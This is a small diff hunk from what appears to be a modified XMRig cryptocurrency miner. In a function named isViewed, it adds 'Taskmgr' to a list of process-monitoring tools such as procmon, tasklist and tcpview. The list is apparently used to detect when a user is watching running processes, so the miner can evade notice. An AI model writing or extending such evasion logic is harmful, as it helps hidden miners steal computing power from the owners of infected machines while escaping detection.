@@ -21,6 +21,7 @@ bool xmrig::Environment::isViewed()
 		"procmon",
 		"regmon",
 		"tasklist",
+		"Taskmgr",
 		"taskmgr",
 		"tcpvcon",
 		"tcpview",
